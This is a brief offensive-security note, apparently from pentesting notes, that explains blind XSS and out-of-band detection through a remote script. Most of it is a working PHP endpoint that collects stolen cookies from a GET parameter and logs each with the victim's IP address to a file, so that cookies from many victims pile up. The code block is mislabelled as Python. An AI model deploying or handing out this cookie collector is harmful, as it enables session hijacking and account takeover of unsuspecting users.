**What is Blind XSS?**
Blind XSS occurs when the injected payload executes on a page the attacker cannot see. Since you cannot see the output, you cannot simply look for an alert() popup. Instead, you use an **out-of-band detection method: loading a remote script.**

### PHP script to order the cookies in new lines and write them to a file
- so that even if multiple victims trigger the xss exploit, we'll get all of their cookies ordered in a file
```python

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
